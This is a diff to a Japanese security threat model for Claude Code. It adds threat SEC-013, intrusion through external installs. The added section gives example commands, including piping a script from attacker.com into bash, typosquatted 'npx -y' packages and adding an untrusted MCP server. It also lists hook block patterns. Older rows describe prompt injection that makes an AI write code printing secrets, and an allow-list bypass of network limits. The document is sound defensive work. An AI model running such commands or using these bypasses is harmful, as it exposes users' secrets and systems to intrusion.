@@ -94,6 +94,7 @@ Claude Code に付与する権限は必要最小限にとどめる。
 | SEC-010 | プロジェクト設定ファイル経由のコード実行 | `.claude/settings.json` の MCP 設定やフック経由で任意コード実行（CVE-2025-59536） | HIGH | LOW | L0, L2 |
 | SEC-011 | allow リスト経由のバイパス | `python3 *` 等の広すぎる allow ルールを悪用してネットワーク通信を迂回 | HIGH | MEDIUM | L2 |
 | SEC-012 | AI 生成コードへのシークレット埋め込み | プロンプトインジェクションで `print(config.items())` 等のシークレット出力コードを生成 | HIGH | MEDIUM | L0, L3 |
+| SEC-013 | 外部インストール経由の侵入 | `curl \| bash`, `npx -y 悪意パッケージ`, 検証なし MCP サーバー追加 | **CRITICAL** | MEDIUM | L3, skills |
 
 ### 各脅威の詳細分析
 
@@ -328,6 +329,42 @@ CVE: CVE-2026-21852（CVSS 5.3）
   - 問題のコードを即座に削除・コミット
   - CI/CD ログに出力されたシークレットをローテーション
   - ログ出力のアクセス権を確認・制限
+```
+
+#### SEC-013: 外部インストール経由の侵入
+
+```
+問題: 新しいツール・ライブラリ・MCPサーバーをインストールする際に、
+      悪意のあるスクリプトやパッケージが実行環境に混入する
+代表例:
+  - curl https://attacker.com/setup.sh | bash
+    （スクリプトの内容を確認せずにパイプで直接実行）
+  - npx -y @typosquat/legitimate-looking-tool
+    （公式パッケージに見せかけたタイポスクワッティング）
+  - claude mcp add untrusted-server -- npx -y @unknown/mcp-server
+    （悪意のある MCP サーバーの追加）
+  - npm install dependency-with-malicious-postinstall
+    （install スクリプトに悪意コードが仕込まれたパッケージ）
+影響度: CRITICAL（シークレット窃取、バックドア設置、永続的侵入）
+発生頻度: MEDIUM（AI エージェントが外部ツール提案する機会が増加中）
+根本原因:
+  - パイプ実行はダウンロードと実行が分離されないため内容確認不可
+  - -y フラグや非インタラクティブモードは確認ステップをスキップ
+  - MCP サーバーはプロセスとして常駐し広い権限を持つ
+解決策:
+  - Layer 3（Hooks）: curl | bash / wget | sh を Safety Gate で自動BLOCK
+  - Layer 3（Hooks）: npx -y, claude mcp add を HIGH リスクに分類→確認要求
+  - Skills（external-install-check）: インストール前の必須セキュリティチェック手順
+  - 推奨手順: curl -o /tmp/check.sh → cat で内容確認 → bash /tmp/check.sh
+検知:
+  - tool-risk.js の Safety Gate: curl/wget | bash/sh パターンを自動ブロック
+  - tool-risk.js の HIGH パターン: npx -y, claude mcp add を要確認に分類
+  - external-install-check スキルによるインストール前レビュー
+復旧:
+  - インストール済みパッケージのアンインストール
+  - 影響を受けた可能性のあるシークレットのローテーション
+  - ~/.claude/mcp.json から不審なサーバーを削除
+  - プロセス一覧（ps aux）で不審なバックグラウンドプロセスを確認
 ```
 
 ---
@@ -1837,3 +1874,4 @@ Phase 3 の Managed Settings に加え、プロジェクトレベルの settings
 |------|----------|------|
 | 2026-03-19 | 1.0.0 | 初版作成。5層防御アーキテクチャ、7脅威モデル、4段階チェックリスト |
 | 2026-03-20 | 1.1.0 | SEC-008〜SEC-012 追加（MCP Elicitation、ANTHROPIC_BASE_URL、設定ファイル経由RCE、allowバイパス、AI生成コード埋め込み）。Elicitation Hook（elicitation-guard.js）追加でHook体制を4本に拡張。Layer 2にallowバイパス穴の注意事項と追加denyルール（macOS固有・インタープリタ）を追記。既知CVE一覧セクション新設（5件）。 |
+| 2026-03-20 | 1.2.0 | SEC-013（外部インストール経由の侵入）追加。tool-risk.js に `curl\|bash` / `wget\|sh` Safety Gate ブロック、`npx -y` / `claude mcp add` HIGH リスクパターン追加。external-install-check スキル新設（MCP・npm・スクリプト導入前必須チェック手順）。 |
